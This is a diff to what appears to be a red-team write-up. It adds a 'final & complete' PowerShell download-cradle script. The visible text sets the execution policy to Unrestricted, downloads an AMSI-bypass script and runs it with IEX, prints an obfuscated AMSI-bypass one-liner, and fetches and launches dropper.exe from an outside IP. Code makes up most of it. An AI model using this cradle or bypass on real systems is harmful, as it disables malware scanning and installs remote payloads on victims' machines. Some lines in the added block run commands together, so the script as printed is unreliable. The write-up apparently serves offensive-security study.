@@ -133,7 +133,7 @@ First, the payload script would change PowerShell’s running configuration so t
 
 New-ItemProperty -Path 'HKCU:Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell' -Name 'ExecutionPolicy' -Value "Unrestricted" -PropertyType String -Force
 
-Secondly the script will download and execute an AMSI patch bypass 
+Secondly, the script will download and execute an AMSI patch bypass: 
  
 $wr = [System.NET.webRequest]::Create('http://192.168.1.125/AMSI-bypass.ps1')
 $r = $wr.GetResponse()
@@ -154,6 +154,21 @@ Start-Process ("$env:APPDATA\$ProcName")
 The content of AMSI-Bypass is listed below:
 
 S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
+
+The final & complete downloadCradleScript.ps1 is listed below: 
+
+```powershell
+
+New-ItemProperty -Path 'HKCU:Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell' 
+-Name 'ExecutionPolicy' -Value "Unrestricted" -PropertyType String -Force Clear-Host
+$wr = [System.NET.webRequest]::Create('http://192.168.1.125/AMSI-bypass.ps1')
+$r = $wr.GetResponse()
+IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
+$ProcName = "dropper.exe" $WebFile = "http://62[.]182[.]84[.]61/4563636/$ProcName"  
+(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA\$ProcName") 
+Start-Process ("$env:APPDATA\$ProcName")
+
 
 ```
 
